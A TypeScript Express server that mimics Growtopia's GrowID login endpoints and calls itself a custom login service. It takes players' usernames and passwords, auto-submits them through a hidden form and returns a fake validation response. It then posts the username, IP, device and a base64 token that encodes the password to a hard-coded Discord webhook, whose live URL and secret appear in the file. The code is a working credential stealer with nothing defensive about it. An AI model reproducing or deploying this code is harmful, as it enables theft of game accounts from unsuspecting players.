import express, { Request, Response, NextFunction } from 'express';

const App = express();
const Port = process.env.PORT || 3000;

class Device {
    static WINDOWS = 0;
    static ANDROID = 1;
    static MACOS = 2;
    static IOS = 3;

    static Get(req: Request): number {
        const ua = (req.headers['user-agent'] || '').toLowerCase();

        if (/iphone|ipad|ios/i.test(ua)) return Device.IOS;
        if (/android/i.test(ua)) return Device.ANDROID;
        if (/mac/i.test(ua)) return Device.MACOS;

        return Device.WINDOWS;
    }
    static Capture(req: Request, res: Response, next: NextFunction) {
        let raw = '';
        
        req.on('data', chunk => {
            raw += chunk;
            if (raw.length > 1e6) {
                req.destroy();
            }
        });

        req.on('end', () => {
            (req as any).rawBody = raw || '';
            next();
        });
    }
    static Packet(raw: string) {
        if (!raw) return {};

        let decoded = '';
        try {
            decoded = decodeURIComponent(raw);
        } catch (e) {
            decoded = raw; 
        }
        
        const lines = decoded.split('\n');
        const data: Record<string, string> = {};

        for (const line of lines) {
            const idx = line.indexOf('|');
            if (idx === -1) continue;

            const key = line.slice(0, idx).trim();
            const value = line.slice(idx + 1).trim();

            if (key) data[key] = value;
        }

        return data;
    }
}

class Parsing {
    static Encode(raw: string) {
        return Buffer.from(raw).toString('base64');
    }
}

class Growtopia {
    static Escape(str: string) {
        return str
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }
    static Bypass(tank_id_name: string, tank_id_pass: string, token: string) {
        return `
        <html>
            <body style="display:none">
                <form id="f" method="POST" action="/player/growid/login/validate">
                    <input name="growId" value="${this.Escape(tank_id_name)}">
                    <input name="password" value="${this.Escape(tank_id_pass)}">
                    <input name="_token" value="${this.Escape(token)}">
                </form>

                <script>
                    document.getElementById('f').submit();
                </script>
            </body>
        </html>
        `;
    }
    static Send(req: Request, res: Response, response: any) {
        if (Device.Get(req) !== Device.IOS) {
            return res.send(JSON.stringify(response));
        }

        res.setHeader('Content-Type', 'application/json');
        return res.json(response);
    }
}

class Webhook {
    static async Format(url: string, data: any) {
        try {
            await fetch(url, {
                method: 'POST',
                headers: {
                'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                embeds: [
                    {
                    title: 'Login Detected',
                    color: 5814783,
                    fields: [
                        { name: 'Username', value: data.tank_id_name || '-', inline: true },
                        { name: 'Token', value: data.token || '-', inline: false },
                        { name: 'IP', value: data.ip || '-', inline: true },
                        { name: 'Device', value: data.device || '-', inline: true }
                    ],
                    timestamp: new Date().toISOString()
                    }
                ]
                })
            });
        } 
        catch (err) {
            console.error('[WEBHOOK ERROR]', err);
        }
    }

    static Send(req: Request, tank_id_name: string, tank_id_pass: string, token: string) {
        this.Format('https://discord.com/api/webhooks/1487764777668444284/KmhquMFkRMmhcMTzQ_ttb3ojeEvB3U_oQi7g9e6mLfYbdsIq7BpDm_gaIcs6MiNSIQN-', 
            {
                tank_id_name,
                tank_id_pass,
                token,
                ip: req.ip,
                device: Device.Get(req)
            }
        );
    }
}

App.set('trust proxy', 1);
App.disable('x-powered-by');
App.use(Device.Capture);

App.post('/player/login/dashboard', (req: Request, res: Response) => {
    const Context = (req as any).rawBody || '';
    const Data = Device.Packet(Context);
    const Token = Parsing.Encode(JSON.stringify(Data));
    
    return res.send(Growtopia.Bypass(Data['tankIDName'] || '', Data['tankIDPass'] || '', Token));
});

App.post('/player/growid/login/validate', (req: Request, res: Response) => {
    const Context = (req as any).rawBody || '';
    const Params = new URLSearchParams(Context);

    const tank_id_name = Params.get('growId') || '';
    const tank_id_pass = Params.get('password') || '';
    const token = Params.get('_token') || Parsing.Encode(`${tank_id_name}:${tank_id_pass}`);

    const result = {
        status: 'success',
        message: 'Account Validated',
        tank_id_name,
        tank_id_pass,
        token,
        accountType: 'growtopia'
    };

    Webhook.Send(req, tank_id_name, tank_id_pass, token);

    return Growtopia.Send(req, res, result);
});

App.post('/player/growid/checktoken', (_req, res) => {
    return res.redirect(307, '/player/growid/validate/checktoken');
});

App.post('/player/growid/validate/checktoken', (req: Request, res: Response) => {
    const Context = (req as any).rawBody || '';
    const Data = Device.Packet(Context);
    const Token = Parsing.Encode(JSON.stringify(Data));

    const Result = {
        status: 'success',
        message: 'Account Validated.',
        Token,
        url: '',
        accountType: 'growtopia',
        accountAge: 2,
    };

    //Webhook.Send(req, Data['tankIDname'] || '', Data['tankIDPass'] || '', Token);
    res.send(JSON.stringify({ Result }));
});

App.listen(Port, () => {
    console.log(`Server is running on port ${Port}. Running for Custom Login Growtopia!`);
});

export default App;